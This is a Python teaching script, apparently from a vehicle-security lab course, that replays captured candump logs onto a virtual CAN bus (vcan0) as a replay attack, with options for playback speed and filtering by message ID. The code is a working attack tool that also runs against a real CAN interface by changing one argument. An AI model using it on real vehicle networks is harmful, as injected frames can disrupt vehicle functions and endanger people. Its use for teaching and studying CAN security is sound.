#!/usr/bin/env python3
"""
CAN Replay Attack — Template for Track B (Medium)

This script replays a captured CAN log file onto the virtual CAN bus.
Students should understand how replay attacks work and why they're dangerous.

Usage:
    python3 replay.py                              # Replay attack_trace.log
    python3 replay.py --file logs/custom.log       # Replay a custom log
    python3 replay.py --speed 2.0                  # Replay at 2x speed
    python3 replay.py --filter 244                 # Only replay ID 0x244

ETHICS: Simulation only. Never use on real vehicles or networks.
"""

import argparse
import time
import sys

try:
    import can
except ImportError:
    print("ERROR: python-can not installed. Run: pip3 install python-can")
    sys.exit(1)


def parse_candump_line(line):
    """Parse a single candump log line into timestamp, arb_id, data."""
    line = line.strip()
    if not line or line.startswith("#"):
        return None

    try:
        ts_str = line.split(")")[0].replace("(", "").strip()
        timestamp = float(ts_str)
        rest = line.split(")")[1].strip()
        parts = rest.split()
        # parts[0] = interface, parts[1] = id#data
        id_data = parts[1]
        arb_id_str, data_str = id_data.split("#")
        arb_id = int(arb_id_str, 16)
        data = bytes.fromhex(data_str)
        return timestamp, arb_id, data
    except (ValueError, IndexError):
        return None


def replay_log(filepath, interface="vcan0", speed=1.0, filter_id=None):
    """Replay a CAN log file onto the bus."""
    print(f"\n{'='*60}")
    print(f"  CAN Replay Attack")
    print(f"  File:      {filepath}")
    print(f"  Interface: {interface}")
    print(f"  Speed:     {speed}x")
    if filter_id is not None:
        print(f"  Filter:    0x{filter_id:03X} only")
    print(f"{'='*60}\n")

    # Parse all frames from the log
    frames = []
    with open(filepath, "r") as f:
        for line in f:
            parsed = parse_candump_line(line)
            if parsed:
                ts, arb_id, data = parsed
                if filter_id is None or arb_id == filter_id:
                    frames.append((ts, arb_id, data))

    if not frames:
        print("ERROR: No frames found in log file.")
        return

    print(f"  Loaded {len(frames)} frames")
    print(f"  Duration: {frames[-1][0] - frames[0][0]:.3f}s (original)")
    print(f"  Press Ctrl+C to stop\n")

    # Connect to CAN bus
    try:
        bus = can.interface.Bus(channel=interface, interface="socketcan")
    except Exception as e:
        print(f"ERROR: Cannot open {interface}: {e}")
        sys.exit(1)

    # Replay with timing
    sent = 0
    start_time = time.time()
    base_ts = frames[0][0]

    try:
        for i, (ts, arb_id, data) in enumerate(frames):
            # Calculate delay
            if i > 0:
                delay = (ts - frames[i-1][0]) / speed
                if delay > 0:
                    time.sleep(delay)

            # Send frame
            msg = can.Message(
                arbitration_id=arb_id,
                data=data,
                is_extended_id=False
            )
            bus.send(msg)
            sent += 1

            elapsed = time.time() - start_time
            print(f"  [{elapsed:7.3f}s] TX 0x{arb_id:03X} [{len(data)}] "
                  f"{data.hex().upper()}")

    except KeyboardInterrupt:
        print("\n  Replay stopped by user.")
    finally:
        bus.shutdown()
        elapsed = time.time() - start_time
        print(f"\n  Sent {sent}/{len(frames)} frames in {elapsed:.1f}s")
        print(f"{'='*60}")


def main():
    parser = argparse.ArgumentParser(description="CAN Replay Attack Tool")
    parser.add_argument("--file", "-f",
                        default="logs/attack_trace.log",
                        help="Log file to replay (default: logs/attack_trace.log)")
    parser.add_argument("--interface", "-i", default="vcan0",
                        help="CAN interface (default: vcan0)")
    parser.add_argument("--speed", "-s", type=float, default=1.0,
                        help="Replay speed multiplier (default: 1.0)")
    parser.add_argument("--filter", type=str, default=None,
                        help="Only replay frames with this hex ID (e.g., 244)")

    args = parser.parse_args()

    filter_id = int(args.filter, 16) if args.filter else None
    replay_log(args.file, args.interface, args.speed, filter_id)


if __name__ == "__main__":
    main()
